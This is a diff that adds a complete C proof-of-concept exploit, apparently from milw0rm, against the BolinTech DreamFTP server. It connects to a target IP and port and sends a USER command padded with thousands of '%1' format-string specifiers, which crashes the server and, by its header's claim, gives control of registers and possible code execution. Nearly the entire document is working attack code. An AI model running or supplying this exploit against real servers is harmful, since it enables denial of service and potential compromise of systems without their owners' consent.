@@ -1,0 +1,80 @@
+/**************************************************************************
+*BolinTech DreamFTP USER buffer overflow                                  *
+*                                                                         *
+*The server does not correctly handle format string so sending a command  *
+*like USER %1*3000 let us own EDX. Other values can also affect EAX & ECX *
+*                                                                         *
+*This is only a POC but code execution is possible                        *
+*                                                                         *
+*usage: dreamftp.exe ip port                                              *
+*                                                                         *
+*Coded by Marsu <Marsupilamipowa@hotmail.fr>                            *
+**************************************************************************/
+
+#include "winsock2.h"
+#include "stdio.h"
+#include "stdlib.h"
+#pragma comment(lib, "ws2_32.lib")
+
+int main(int argc, char* argv[])
+{
+	struct hostent *he;
+	struct sockaddr_in sock_addr;
+	WSADATA wsa;
+	int ftpsock;
+	char recvbuff[1024];
+	char evilbuff[5003];
+	int buflen=5000;// edx=31253125
+	int i;
+
+	if (argc!=3)
+	{
+		printf("[+] Usage: %s <ip> <port>\n",argv[0]);
+		return 1;
+	}
+	WSACleanup();
+	WSAStartup(MAKEWORD(2,0),&wsa);
+
+	printf("[+] Connecting to %s:%s ... ",argv[1],argv[2]);
+	if ((he=gethostbyname(argv[1])) == NULL) {
+		printf("Failed\n[-] Could not init gethostbyname\n");
+		return 1;
+	}
+	if ((ftpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
+		printf("Failed\n[-] Socket error\n");
+		return 1;
+	}
+
+	sock_addr.sin_family = PF_INET;
+	sock_addr.sin_port = htons(atoi(argv[2]));
+	sock_addr.sin_addr = *((struct in_addr *)he->h_addr);
+	memset(&(sock_addr.sin_zero), '\0', 8);
+	if (connect(ftpsock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
+		printf("Failed\n[-] Sorry, cannot connect to %s:%s. Error: %i\n", argv[1],argv[2],WSAGetLastError());
+		return 1;
+	}
+	printf("OK\n");
+	memset(recvbuff,'\0',1024);
+	recv(ftpsock, recvbuff, 1024, 0);
+
+	printf("[+] Building payload ... ");
+	for (i=0;i<buflen;i+=2) {
+		memcpy(evilbuff+i,"%1",2);
+	}
+
+	memcpy(evilbuff,"USER ",5);
+	memcpy(evilbuff+buflen,"\r\n\0",3);
+	printf("OK\n[+] Sending USER ... ");
+	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
+		printf("Failed\n[-] Could not send\n");
+		return 1;
+	}
+	printf("OK\n");
+	memset(recvbuff,'\0',1024);
+	recv(ftpsock, recvbuff, 1024, 0);
+	Sleep(1000);
+	printf("[+] Host should be down\n");
+	return 0;
+}
+
+// milw0rm.com [2007-01-14]
